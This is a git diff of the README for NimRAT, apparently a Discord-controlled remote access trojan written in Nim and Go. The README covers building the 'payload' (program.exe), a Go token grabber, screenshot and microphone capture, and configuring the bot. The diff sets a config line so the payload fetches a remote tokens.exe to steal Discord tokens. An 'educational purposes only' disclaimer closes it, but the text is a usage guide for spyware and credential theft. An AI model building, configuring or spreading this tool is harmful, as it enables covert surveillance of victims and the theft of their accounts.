@@ -1,8 +1,7 @@
 
 # NimRAT
 
-A simple discord-based remote access tool using Nim and Go.
-
+A simple discord-based remote access tool using Nim and Go. Please leave a ⭐ if you have found this project useful :)
 
 ## Features
 
@@ -17,10 +16,15 @@ A simple discord-based remote access tool using Nim and Go.
 - Make screenshots and record microphone
 - And more!
 
+## Screenshots
+![image](https://github.com/user-attachments/assets/ef953825-c79b-47a0-8480-791bf3d2450e)  
+![image](https://github.com/user-attachments/assets/dee6df5f-8c90-406d-8484-7744fa664e72)  
+![image](https://github.com/user-attachments/assets/0f5d1fe2-8dce-419c-8dea-e016beba9c25)  
+![image](https://github.com/user-attachments/assets/dddc761a-f2ae-443e-898b-6875e5316987)
 
 ## Requirements
 
-You should have Nim and Go installed. Nim for the main payload, Go for discord tokens. If you don't want to compile the token grabber yourself, you can skip Go installation.
+You should have Nim and Go installed. Nim for the main payload, Go for the discord tokens. If you don't want to compile the token grabber yourself, you can skip Go installation.
 
 Download Nim - https://nim-lang.org/install.html
 
@@ -46,16 +50,22 @@ Open modules/config.nim with any text editor and change values
 
 ```nim
 let newUsersChannelId* = "" # You will be notified about new users in this channel
-let tokenDecryptorUrl* = "" # You can leave it as is or upload your token grabber 
+let tokenDecryptorUrl* = "https://github.com/WipingAllOut/NimRAT/raw/refs/heads/main/GoTokenGrabber/tokens.exe" # You can leave it as is or upload your token grabber 
 let discordToken* = "" # Your discord bot token (https://discord.com/developers/applications)
 ```
 
 Now launch `compile.bat` and select option 3. If no errors occur, your payload will be in the same folder, `program.exe`.
 
+Important: make sure your discord bot has Message Content Intent enabled!
+
+![image](https://github.com/user-attachments/assets/2fef6b25-b677-4620-a81b-bd763b135726)
+
+To show the list of commands, type `.help`.
 
 ## TODO
 - [ ]  Get user's data from discord token (username, has nitro, etc)  
 - [ ]  Get tdata
+
 ## Disclaimer
 
 This project is for educational purposes only and aims to promote learning about cybersecurity and ethical hacking.
